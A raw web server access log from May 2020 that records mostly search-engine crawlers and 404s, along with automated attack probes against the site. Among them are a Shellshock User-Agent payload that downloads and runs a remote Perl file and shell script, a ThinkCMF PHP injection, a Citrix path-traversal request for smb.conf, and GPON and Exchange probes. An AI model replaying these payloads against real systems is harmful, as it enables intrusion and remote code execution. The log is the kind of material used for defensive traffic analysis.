[Fri May 15 2020 12:52:05 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/consultants/wanted-accountants/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Fri May 15 2020 12:52:05 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/consultants/wanted-accountants/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 12:52:39 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/consultants/start-business-india-sitting-overseas/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Fri May 15 2020 12:52:39 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/consultants/start-business-india-sitting-overseas/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 12:53:13 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/consultants/business-owners-tally-reading-made-easy/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Fri May 15 2020 12:53:13 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/consultants/business-owners-tally-reading-made-easy/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 12:53:47 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/consultants/attend-workshop-be-a-confident-startup-entrepreneur/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Fri May 15 2020 12:53:47 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/consultants/attend-workshop-be-a-confident-startup-entrepreneur/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 12:54:22 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/trading-business/be-a-confident-startup-entrepreneur/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Fri May 15 2020 12:54:22 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/trading-business/be-a-confident-startup-entrepreneur/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 12:54:58 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/consultants/webinar-for-startup-business-entrepreneurs/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Fri May 15 2020 12:54:58 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/consultants/webinar-for-startup-business-entrepreneurs/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 13:20:35 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Fri May 15 2020 13:20:36 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Fri May 15 2020 13:20:37 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Fri May 15 2020 13:20:39 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Fri May 15 2020 13:20:39 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 13:20:40 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Fri May 15 2020 13:20:40 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 13:46:14 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Fri May 15 2020 15:41:19 GMT+0000 (UTC)]  "[36mGET[39m [36m/robots.txt[39m" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
[Fri May 15 2020 15:41:19 GMT+0000 (UTC)]  "[31mGET[39m [31m/robots.txt[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 15:41:19 GMT+0000 (UTC)]  "[36mGET[39m [36m/robots.txt[39m" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
[Fri May 15 2020 15:41:19 GMT+0000 (UTC)]  "[31mGET[39m [31m/robots.txt[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 15:41:32 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
[Fri May 15 2020 15:53:09 GMT+0000 (UTC)]  "[36mGET[39m [36m/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f[39m" "Mozilla/5.0 zgrab/0.x"
[Fri May 15 2020 15:53:09 GMT+0000 (UTC)]  "[31mGET[39m [31m/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 17:44:58 GMT+0000 (UTC)]  "[36mGET[39m [36m/login.html[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Fri May 15 2020 17:44:58 GMT+0000 (UTC)]  "[31mGET[39m [31m/login.html[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 17:57:40 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Fri May 15 2020 17:57:40 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Fri May 15 2020 17:57:40 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Fri May 15 2020 17:57:41 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Fri May 15 2020 17:57:41 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 18:17:56 GMT+0000 (UTC)]  "[36mGET[39m [36m/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Fri May 15 2020 18:17:57 GMT+0000 (UTC)]  "[36mGET[39m [36m/?XDEBUG_SESSION_START=phpstorm[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Fri May 15 2020 23:48:30 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 zgrab/0.x"
[Fri May 15 2020 23:51:13 GMT+0000 (UTC)]  "[36mHEAD[39m [36m/[39m" "CheckMarkNetwork/1.0 (+http://www.checkmarknetwork.com/spider.html)"
[Fri May 15 2020 23:51:13 GMT+0000 (UTC)]  "[36mGET[39m [36m/robots.txt[39m" "CheckMarkNetwork/1.0 (+http://www.checkmarknetwork.com/spider.html)"
[Fri May 15 2020 23:51:13 GMT+0000 (UTC)]  "[31mGET[39m [31m/robots.txt[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 23:51:19 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "CheckMarkNetwork/1.0 (+http://www.checkmarknetwork.com/spider.html)"
[Fri May 15 2020 23:51:19 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "CheckMarkNetwork/1.0 (+http://www.checkmarknetwork.com/spider.html)"
[Fri May 15 2020 23:51:20 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "CheckMarkNetwork/1.0 (+http://www.checkmarknetwork.com/spider.html)"
[Fri May 15 2020 23:51:21 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "CheckMarkNetwork/1.0 (+http://www.checkmarknetwork.com/spider.html)"
[Fri May 15 2020 23:51:22 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "CheckMarkNetwork/1.0 (+http://www.checkmarknetwork.com/spider.html)"
[Fri May 15 2020 23:51:36 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 zgrab/0.x"
[Sat May 16 2020 00:41:51 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "undefined"
[Sat May 16 2020 01:01:46 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 zgrab/0.x"
[Sat May 16 2020 01:37:42 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Sat May 16 2020 01:37:44 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Sat May 16 2020 01:37:45 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Sat May 16 2020 01:37:46 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Sat May 16 2020 01:37:46 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sat May 16 2020 01:37:47 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Sat May 16 2020 01:37:47 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sat May 16 2020 01:48:13 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"
[Sat May 16 2020 01:57:49 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
[Sat May 16 2020 02:07:05 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "undefined"
[Sat May 16 2020 02:28:57 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Sat May 16 2020 04:45:42 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "() { :;}; /bin/bash -c "killall -9 perl;cd /tmp;curl -O http://46.18.33.22/work/m;wget http://46.18.33.22/work/m;lwp-download http://46.18.33.22/work/m;perl m; rm -rf m*;wget http://46.18.33.22/work/enix.sh;chmod +x enix.sh;./enix.sh""
[Sat May 16 2020 04:54:59 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
[Sat May 16 2020 04:57:33 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 zgrab/0.x"
[Sat May 16 2020 05:05:00 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 zgrab/0.x"
[Sat May 16 2020 10:22:56 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Sat May 16 2020 10:22:59 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Sat May 16 2020 10:23:01 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Sat May 16 2020 10:23:05 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Sat May 16 2020 10:23:05 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sat May 16 2020 10:33:19 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Linux; Android 10; Redmi K20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36"
[Sat May 16 2020 10:33:20 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "Mozilla/5.0 (Linux; Android 10; Redmi K20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36"
[Sat May 16 2020 10:33:20 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "Mozilla/5.0 (Linux; Android 10; Redmi K20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36"
[Sat May 16 2020 10:33:22 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (Linux; Android 10; Redmi K20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36"
[Sat May 16 2020 10:33:22 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sat May 16 2020 11:57:08 GMT+0000 (UTC)]  "[36mPOST[39m [36m/GponForm/diag_Form?style/[39m" "curl/7.3.2"
[Sat May 16 2020 11:57:08 GMT+0000 (UTC)]  "[31mPOST[39m [31m/GponForm/diag_Form?style/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sat May 16 2020 12:02:13 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Sat May 16 2020 13:33:09 GMT+0000 (UTC)]  "[36mGET[39m [36m/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Sat May 16 2020 13:33:10 GMT+0000 (UTC)]  "[36mGET[39m [36m/?XDEBUG_SESSION_START=phpstorm[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Sat May 16 2020 13:41:30 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Sat May 16 2020 13:41:31 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Sat May 16 2020 13:41:32 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Sat May 16 2020 13:41:33 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Sat May 16 2020 13:41:33 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sat May 16 2020 13:41:34 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Sat May 16 2020 13:41:34 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sat May 16 2020 16:45:21 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Sat May 16 2020 18:37:14 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
[Sat May 16 2020 19:57:23 GMT+0000 (UTC)]  "[36mGET[39m [36m/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f[39m" "Mozilla/5.0 zgrab/0.x"
[Sat May 16 2020 19:57:23 GMT+0000 (UTC)]  "[31mGET[39m [31m/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sat May 16 2020 22:48:49 GMT+0000 (UTC)]  "[36mGET[39m [36m/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Sat May 16 2020 22:48:50 GMT+0000 (UTC)]  "[36mGET[39m [36m/?XDEBUG_SESSION_START=phpstorm[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Sun May 17 2020 00:02:03 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 zgrab/0.x"
[Sun May 17 2020 00:03:43 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 zgrab/0.x"
[Sun May 17 2020 00:37:48 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "undefined"
[Sun May 17 2020 00:41:42 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Sun May 17 2020 00:41:43 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Sun May 17 2020 00:41:44 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Sun May 17 2020 00:41:45 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Sun May 17 2020 00:41:45 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 00:41:46 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Sun May 17 2020 00:41:46 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 02:33:04 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Sun May 17 2020 02:40:19 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "PycURL/7.43.0.2 libcurl/7.64.0 GnuTLS/3.6.7 zlib/1.2.11 libidn2/2.0.5 libpsl/0.20.2 (+libidn2/2.0.5) libssh2/1.8.0 nghttp2/1.36.0 librtmp/2.3"
[Sun May 17 2020 02:55:40 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Sun May 17 2020 03:43:53 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
[Sun May 17 2020 04:11:00 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
[Sun May 17 2020 07:06:06 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Sun May 17 2020 07:06:08 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Sun May 17 2020 07:06:08 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Sun May 17 2020 07:06:08 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Sun May 17 2020 07:06:08 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 08:56:29 GMT+0000 (UTC)]  "[36mGET[39m [36m/cgi-bin/config.exp[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Sun May 17 2020 08:56:29 GMT+0000 (UTC)]  "[31mGET[39m [31m/cgi-bin/config.exp[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 09:20:09 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "HTTP Banner Detection (https://security.ipip.net)"
[Sun May 17 2020 10:15:26 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
[Sun May 17 2020 10:42:45 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Sun May 17 2020 10:42:45 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Sun May 17 2020 10:42:45 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Sun May 17 2020 10:42:46 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Sun May 17 2020 10:42:46 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 12:15:38 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Sun May 17 2020 12:15:40 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Sun May 17 2020 12:15:41 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Sun May 17 2020 12:15:42 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Sun May 17 2020 12:15:42 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 12:15:43 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Sun May 17 2020 12:15:43 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 13:24:53 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 zgrab/0.x"
[Sun May 17 2020 15:05:44 GMT+0000 (UTC)]  "[36mGET[39m [36m/vpn/../vpns/cfg/smb.conf[39m" "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.27.1 zlib/1.2.3 libidn/1.18 libssh2/1.4.2"
[Sun May 17 2020 15:05:44 GMT+0000 (UTC)]  "[31mGET[39m [31m/vpn/../vpns/cfg/smb.conf[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 18:58:27 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Sun May 17 2020 18:58:27 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 20:26:51 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 zgrab/0.x"
[Sun May 17 2020 20:43:24 GMT+0000 (UTC)]  "[36mGET[39m [36m/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Sun May 17 2020 20:43:24 GMT+0000 (UTC)]  "[36mGET[39m [36m/?XDEBUG_SESSION_START=phpstorm[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Sun May 17 2020 21:30:05 GMT+0000 (UTC)]  "[36mGET[39m [36m/robots.txt[39m" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
[Sun May 17 2020 21:30:05 GMT+0000 (UTC)]  "[31mGET[39m [31m/robots.txt[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 21:30:05 GMT+0000 (UTC)]  "[36mGET[39m [36m/robots.txt[39m" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
[Sun May 17 2020 21:30:05 GMT+0000 (UTC)]  "[31mGET[39m [31m/robots.txt[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 21:30:38 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/category/trading-business/[39m" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
[Sun May 17 2020 21:30:38 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/category/trading-business/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 21:39:24 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
[Sun May 17 2020 21:45:47 GMT+0000 (UTC)]  "[36mGET[39m [36m/robots.txt[39m" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Sun May 17 2020 21:45:47 GMT+0000 (UTC)]  "[31mGET[39m [31m/robots.txt[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 21:45:48 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/trading-business/business-owners-tally-reading-made-easy-2/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Sun May 17 2020 21:45:48 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/trading-business/business-owners-tally-reading-made-easy-2/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 22:23:14 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0"
[Sun May 17 2020 23:29:46 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
